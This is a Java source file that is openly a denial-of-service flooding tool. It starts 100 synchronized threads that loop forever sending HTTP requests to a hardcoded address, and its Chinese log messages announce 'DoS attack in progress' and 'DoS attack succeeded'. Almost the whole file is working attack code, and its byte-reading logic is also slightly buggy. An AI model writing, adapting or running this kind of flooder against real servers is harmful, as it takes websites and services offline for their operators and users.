package com.tarzan.reptile.demo;

import lombok.extern.slf4j.Slf4j;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.net.URL;
import java.net.URLConnection;
import java.util.concurrent.BrokenBarrierException;
import java.util.concurrent.CyclicBarrier;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

@Slf4j
public class MultiThread{

    //攻击的网路地址或ip
    private static String ipAddr = "http://172.18.80.1/blog/article/1";



    private static CyclicBarrier cyclicBarrier = new CyclicBarrier(100);

    public static void main(String[] args) {
        ExecutorService executorService = Executors.newCachedThreadPool();
        for (int i=0;i<100;i++){
            executorService.execute(()->{
                try {
                    play();
                } catch (BrokenBarrierException e) {
                    e.printStackTrace();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            });
        }
    }

    public static void play() throws BrokenBarrierException, InterruptedException {
        System.out.println(Thread.currentThread().getName() + " 已准备");
        cyclicBarrier.await();
        System.out.println(Thread.currentThread().getName() + " 开始执行");
        run();
    }


    public static void run() {
        while (true) {
            try {
                URL url = new URL(ipAddr);
                URLConnection conn = url.openConnection();
                BufferedInputStream bis = new BufferedInputStream(
                        conn.getInputStream());
                byte[] bytes = new byte[10240];
                int len = -1;
                StringBuffer sb = new StringBuffer();
                if (bis != null) {
                    if ((len = bis.read()) != -1) {
                        sb.append(new String(bytes, 0, len));
                        log.info("doss攻击中。。。");
                        bis.close();
                    }
                }
            } catch (IOException e) {
                log.info("doss攻击成功！！！");
            }
        }
    }
}
